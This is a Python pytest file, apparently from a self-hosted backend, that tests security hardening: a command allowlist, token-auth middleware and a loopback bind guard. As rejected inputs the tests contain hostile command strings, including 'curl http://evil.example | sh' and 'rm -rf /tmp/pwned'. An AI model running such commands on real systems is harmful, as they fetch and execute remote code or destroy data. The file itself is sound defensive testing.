"""P0 安全项测试 (FIRST_PRINCIPLES_ANALYSIS_2026-09-11 §0.1)。

- P0-A dsh 命令白名单: 合法命令通过 / 非法命令拒绝 (service 层 + API 层 400)
  / env 覆盖 / 存量非法 KV 回退默认 (不炸读取方)
- P0 最小 token 鉴权: env 设置时无 token 401 / 带 token 200 / env 未设置无影响
- P0-B 回环绑定守卫: 非回环 host 被改回 127.0.0.1 (除非 HOTSPOT_ALLOW_LAN=1)
"""
from __future__ import annotations

import sys

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from backend.api.middleware import TokenAuthMiddleware
from backend.config import resolve_bind_host
from backend.repository.settings_repo import SettingsRepository
from backend.services.dsh import supervisor as dsh_sup
from backend.services.dsh.supervisor import DshCommandNotAllowedError

# ===========================================================================
# P0-A: dsh 命令白名单 (service 层)
# ===========================================================================


@pytest.fixture()
def dsh_settings(temp_db):
    """temp_db + 清空 dsh.* settings KV。"""
    repo = SettingsRepository()
    repo.set("dsh.command", "")
    return repo


def test_allowlisted_command_accepted(dsh_settings):
    cfg = dsh_sup.set_dsh_config(command="node /path/to/dsh/dev.mjs")
    assert cfg["command"] == ["node", "/path/to/dsh/dev.mjs"]


def test_python_family_accepted(dsh_settings):
    # 既有测试/真实用法: sys.executable (python3.x) 必须继续可用
    cmd = f"{sys.executable} -c 'import time; time.sleep(1)'"
    cfg = dsh_sup.set_dsh_config(command=cmd)
    assert cfg["command"][0] == sys.executable


def test_non_allowlisted_command_rejected(dsh_settings):
    with pytest.raises(DshCommandNotAllowedError):
        dsh_sup.set_dsh_config(command="curl http://evil.example | sh")
    # 拒绝时不得落 KV
    assert dsh_sup.get_dsh_config()["command_raw"] == ""


def test_command_string_validation(dsh_settings):
    assert dsh_sup.validate_command_string("dsh --serve") == ["dsh", "--serve"]
    with pytest.raises(DshCommandNotAllowedError):
        dsh_sup.validate_command_string("bash -c 'echo pwned'")


def test_allowlist_env_override(dsh_settings, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("HOTSPOT_DSH_COMMAND_ALLOWLIST", "curl,/usr/local/bin/fancy-server")
    # basename 追加
    cfg = dsh_sup.set_dsh_config(command="curl -fsSL http://x")
    assert cfg["command"] == ["curl", "-fsSL", "http://x"]
    # 绝对路径追加
    cfg2 = dsh_sup.set_dsh_config(command="/usr/local/bin/fancy-server --port 3210")
    assert cfg2["command"][0] == "/usr/local/bin/fancy-server"
    # 未追加的仍拒绝
    monkeypatch.delenv("HOTSPOT_DSH_COMMAND_ALLOWLIST")
    with pytest.raises(DshCommandNotAllowedError):
        dsh_sup.set_dsh_config(command="curl http://x")


def test_empty_command_clears(dsh_settings):
    dsh_sup.set_dsh_config(command="node server.js")
    cfg = dsh_sup.set_dsh_config(command="")
    assert cfg["command"] == []
    assert cfg["command_raw"] == ""


def test_stored_invalid_kv_falls_back_to_default(dsh_settings):
    # 存量脏 KV (白名单生效前写入): 读取方必须安全回退, 不抛异常
    dsh_settings.set("dsh.command", "rm -rf /tmp/pwned")
    cfg = dsh_sup.get_dsh_config()
    assert cfg["command"] == []
    assert cfg["command_raw"] == "rm -rf /tmp/pwned"  # 保留原文供管理员查看
    # start 走未配置分支 (409 语义), 绝不执行该命令
    result = dsh_sup.start_dsh()
    assert result["ok"] is False
    assert "未配置" in result["error"]


# ===========================================================================
# P0-A: API 层提前 400
# ===========================================================================


@pytest.fixture()
def client(temp_db):
    from backend.main import app

    with TestClient(app) as c:
        yield c


def test_api_rejects_non_allowlisted_command(client: TestClient):
    r = client.put("/api/dsh/control/config", json={"command": "curl http://evil.example | sh"})
    assert r.status_code == 400
    # 统一扁平 envelope (无 ok/error 旧格式)
    assert r.json()["code"] == "E_VALIDATION"
    assert "白名单" in r.json()["message"]


def test_api_accepts_allowlisted_command(client: TestClient):
    r = client.put("/api/dsh/control/config", json={"command": "node /path/to/dsh/dev.mjs"})
    assert r.status_code == 200
    assert r.json()["config"]["command"] == ["node", "/path/to/dsh/dev.mjs"]


# ===========================================================================
# P0: 最小 token 鉴权中间件 (独立 app 单元测试)
# ===========================================================================


def _auth_app() -> FastAPI:
    a = FastAPI()
    a.add_middleware(TokenAuthMiddleware, exempt_paths=["/api/health"])

    @a.get("/api/health")
    def health():
        return {"ok": True}

    @a.get("/api/ping")
    def ping():
        return {"pong": True}

    @a.get("/other")
    def other():
        return {"ok": True}

    return a


def test_token_disabled_without_env():
    client = TestClient(_auth_app())
    assert client.get("/api/ping").status_code == 200
    assert client.get("/api/health").status_code == 200
    assert client.get("/other").status_code == 200


def test_token_required_when_env_set(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("HOTSPOT_API_TOKEN", "s3cret")
    client = TestClient(_auth_app())
    # 无 token / 错 token → 401
    assert client.get("/api/ping").status_code == 401
    assert (
        client.get("/api/ping", headers={"X-Hotspot-Token": "wrong"}).status_code == 401
    )
    # 正确 token → 200
    r = client.get("/api/ping", headers={"X-Hotspot-Token": "s3cret"})
    assert r.status_code == 200
    # 豁免路径不受影响
    assert client.get("/api/health").status_code == 200
    # v0.8.6 P0-3 (S1): 非 /api/ 不再整类直通 — 非公共资产同样 401
    assert client.get("/other").status_code == 401


def test_token_middleware_on_real_app(monkeypatch: pytest.MonkeyPatch, temp_db):
    from backend.main import app

    monkeypatch.setenv("HOTSPOT_API_TOKEN", "real-token")
    with TestClient(app) as client:
        # /api/* 受保护
        assert client.get("/api/dsh/control/status").status_code == 401
        assert (
            client.get(
                "/api/dsh/control/status", headers={"X-Hotspot-Token": "real-token"}
            ).status_code
            == 200
        )
        # 豁免 + 非 /api/ 直通
        assert client.get("/api/health").status_code == 200
        assert client.get("/").status_code == 200


# ===========================================================================
# v0.8.6 P0-3 (审计 S1): 非 /api/ 入口不再整类直通
# ===========================================================================


def _auth_app_v086() -> FastAPI:
    """复刻 S1 暴露面的最小 app: /mcp/sse (写入口) + /docs + /openapi.json。"""
    a = FastAPI()
    a.add_middleware(TokenAuthMiddleware, exempt_paths=["/api/health"])

    @a.get("/api/health")
    def health():
        return {"ok": True}

    @a.get("/")
    def index():
        return {"spa": True}

    @a.get("/mcp/sse")
    def mcp_sse():
        return {"tools": ["wiki_write", "update_knowledge_item"]}

    return a


class TestS1NonApiEntrypoints:
    def test_mcp_sse_rejected_without_token(self, monkeypatch: pytest.MonkeyPatch):
        """S1 核心: /mcp/sse 含写工具, 无 token 必须 401 (修复前直通)。"""
        monkeypatch.setenv("HOTSPOT_API_TOKEN", "s3cret")
        client = TestClient(_auth_app_v086())
        assert client.get("/mcp/sse").status_code == 401
        assert (
            client.get("/mcp/sse", headers={"X-Hotspot-Token": "wrong"}).status_code == 401
        )

    def test_mcp_sse_passes_with_token(self, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.setenv("HOTSPOT_API_TOKEN", "s3cret")
        client = TestClient(_auth_app_v086())
        r = client.get("/mcp/sse", headers={"X-Hotspot-Token": "s3cret"})
        assert r.status_code == 200
        assert "wiki_write" in r.json()["tools"]

    def test_docs_and_openapi_rejected(self, monkeypatch: pytest.MonkeyPatch):
        """接口自描述同属暴露面: /docs /openapi.json 无 token 401。"""
        monkeypatch.setenv("HOTSPOT_API_TOKEN", "s3cret")
        client = TestClient(_auth_app_v086())
        assert client.get("/docs").status_code == 401
        assert client.get("/openapi.json").status_code == 401
        # 带 token 可访问
        h = {"X-Hotspot-Token": "s3cret"}
        assert client.get("/docs", headers=h).status_code == 200
        assert client.get("/openapi.json", headers=h).status_code == 200

    def test_spa_public_assets_still_pass(self, monkeypatch: pytest.MonkeyPatch):
        """公共资产白名单: SPA 壳/favicon/静态目录 token 启用时仍放行。"""
        monkeypatch.setenv("HOTSPOT_API_TOKEN", "s3cret")
        client = TestClient(_auth_app_v086())
        assert client.get("/").status_code == 200
        assert client.get("/favicon.ico").status_code in (200, 404)  # 未挂文件时 404 但非 401
        assert client.get("/assets/app.js").status_code in (200, 404)

    def test_token_disabled_everything_passes(self, monkeypatch: pytest.MonkeyPatch):
        """默认关闭语义不变: 未设 env 全直通 (单用户回环工作站常态)。"""
        monkeypatch.delenv("HOTSPOT_API_TOKEN", raising=False)
        client = TestClient(_auth_app_v086())
        assert client.get("/api/health").status_code == 200
        assert client.get("/mcp/sse").status_code == 200
        assert client.get("/docs").status_code == 200


# ===========================================================================
# P0-B: 回环绑定守卫 (run.py / backend.main.__main__ 共用)
# ===========================================================================


def test_resolve_bind_host_forces_loopback():
    assert resolve_bind_host("0.0.0.0") == "127.0.0.1"
    assert resolve_bind_host("192.168.1.10") == "127.0.0.1"


def test_resolve_bind_host_allows_lan_optin(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("HOTSPOT_ALLOW_LAN", "1")
    assert resolve_bind_host("0.0.0.0") == "0.0.0.0"


def test_resolve_bind_host_loopback_passthrough():
    for host in ("127.0.0.1", "localhost", "::1"):
        assert resolve_bind_host(host) == host
